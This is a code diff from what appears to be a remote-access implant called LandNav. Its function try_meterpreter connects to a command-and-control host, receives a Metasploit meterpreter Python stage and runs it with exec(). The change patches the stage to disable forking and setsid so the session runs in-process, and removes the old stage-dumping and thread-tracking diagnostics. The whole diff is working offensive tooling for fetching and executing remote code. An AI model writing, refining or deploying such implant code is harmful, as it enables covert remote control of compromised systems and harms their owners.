@@ -399,31 +399,35 @@ def try_meterpreter(c2_host, ports, connect_timeout=10, retry_delay=5,
             _c2_method = "meterpreter"
             _meterpreter_socket = s
 
-            # Dump the decompressed stage to disk for diagnostics —
-            # we need to see what the code actually does
-            _stage_dump = Path("/clients/landnav_stage_dump.py")
-            try:
-                _stage_bytes = (prepared if isinstance(prepared, bytes)
-                                else prepared.encode("utf-8"))
-                _stage_dump.write_bytes(_stage_bytes)
-                log.info("Stage dumped to %s (%d bytes)",
-                         _stage_dump, len(_stage_bytes))
-            except Exception as _e:
-                log.warning("Could not dump stage: %s", _e)
-
             # Clear the staging timeout — the meterpreter dispatch
             # loop needs blocking I/O (or sets its own timeouts)
             s.settimeout(None)
 
-            # Snapshot threads before exec
-            _pre = set(t.ident for t in threading.enumerate())
+            # The MSF Python meterpreter stage calls os.fork() to
+            # daemonize itself (TRY_TO_FORK = True).  The parent
+            # returns from exec() instantly; the child runs the
+            # dispatch loop in a separate process.  This breaks our
+            # session management: LandNav closes the socket, re-
+            # cascades, and interferes with the child.
+            #
+            # Fix: patch the stage source to disable fork+setsid.
+            # The dispatch loop runs directly in this thread —
+            # exec() blocks for the session lifetime.
+            if isinstance(prepared, bytes):
+                prepared = prepared.replace(
+                    b'TRY_TO_FORK = True', b'TRY_TO_FORK = False')
+                prepared = prepared.replace(
+                    b'os.setsid()', b'pass  # landnav: keep tty')
+            else:
+                prepared = prepared.replace(
+                    'TRY_TO_FORK = True', 'TRY_TO_FORK = False')
+                prepared = prepared.replace(
+                    'os.setsid()', 'pass  # landnav: keep tty')
+            log.info("Meterpreter stage patched: fork disabled, "
+                     "setsid disabled — dispatch runs in-process")
 
-            log.info("Meterpreter stage executing (threads before: %d)",
-                     len(_pre))
             _t0 = time.monotonic()
             try:
-                # exec source directly — match the standard MSF stager
-                # pattern exactly (no pre-compile step)
                 exec(prepared, {"s": s})
             except SystemExit as e:
                 log.warning("Meterpreter stage called sys.exit(%s)", e.code)
@@ -433,30 +437,11 @@ def try_meterpreter(c2_host, ports, connect_timeout=10, retry_delay=5,
                 import traceback
                 log.error("Stage traceback:\n%s", traceback.format_exc())
 
-            # Check for dispatch threads spawned by the stage
-            _post = set(t.ident for t in threading.enumerate())
-            _new = _post - _pre
-            _met_threads = [t for t in threading.enumerate()
-                            if t.ident in _new and t.is_alive()]
-
-            log.info("exec() returned: threads after=%d new=%d alive=%d",
-                     len(_post), len(_new), len(_met_threads))
-
-            if _met_threads:
-                log.info("Meterpreter spawned %d dispatch thread(s) — "
-                         "session alive, waiting for session end",
-                         len(_met_threads))
-                for t in _met_threads:
-                    try:
-                        t.join()
-                    except Exception:
-                        pass
-                log.info("All meterpreter threads exited")
-
             elapsed = time.monotonic() - _t0
             _meterpreter_socket = None
 
-            # Session is truly dead now — mark FAILED for re-cascade
+            # exec() blocked for the session lifetime.  Now it's
+            # truly dead — mark FAILED for re-cascade.
             if elapsed < 5:
                 log.warning("Meterpreter session died after %.1fs — "
                             "backing off 30s before retry", elapsed)
